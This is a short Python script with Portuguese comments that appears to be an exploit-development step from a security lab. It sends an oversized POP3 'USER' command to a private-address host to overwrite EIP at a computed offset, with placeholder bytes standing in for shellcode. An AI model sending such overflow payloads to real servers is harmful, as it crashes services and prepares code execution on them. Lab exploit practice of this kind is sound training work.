#!/usr/bin/python
import socket,time

# Gerando a lista para fuzzing
# msf-pattern_offset -q 306F4739 -l 5400 => OffSet = 5099
buf = "A" * 5099
eip = "BBBB"
shellcode = "C" * 3000
payload = buf + eip + shellcode

# Conectando na aplicacao
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("10.2.0.9", 110))
s.recv(1024)

# Enviando o payload
s.send(b"USER " + payload.encode() + b"\r\n")
print (s.recv(1024))
s.send(b"QUIT\r\n")
s.close()
